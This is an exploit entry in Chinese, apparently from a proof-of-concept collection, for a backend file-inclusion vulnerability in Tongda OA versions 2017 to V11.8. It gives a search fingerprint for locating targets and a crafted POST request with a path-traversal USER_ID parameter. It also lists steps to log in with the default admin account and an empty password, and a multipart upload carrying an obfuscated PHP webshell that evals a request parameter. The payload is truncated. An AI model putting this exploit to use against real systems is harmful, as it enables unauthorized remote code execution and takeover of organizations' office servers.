# 通达OAupdate存在后台文件包含漏洞

- **系统**：通达OA　|　**类型**：文件包含　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/tongda HTTP/1.1`

**请求体 / payload**
```
1. 使用默认密码admin，密码为空或采用通达OA任意用户登录登录后台；
2. 通过上一步获取的cookie到日志文件`tongda.log`
Cookie: PHPSESSID=v5pjfe3ign7ge166a6383hnu01; path=/
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Host:
Content-Length: 471
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="ATTACHMENT"; filename="tongda.log"
Content-Type: text/plain
<?php class Gz5SfY10 { public function __construct($H7Es8){ @eval("/*Z7y11Eib8N*/".$H7Es8.""); }}new Gz5SfY10($_REQUEST['x']);?>
-----------------------------17518323986548992951984057104
Co…（脚本共 1506 字，完整版见原文）
```

**其他**
- 通达OA update存在后台文件包含漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达2017-通达V11.8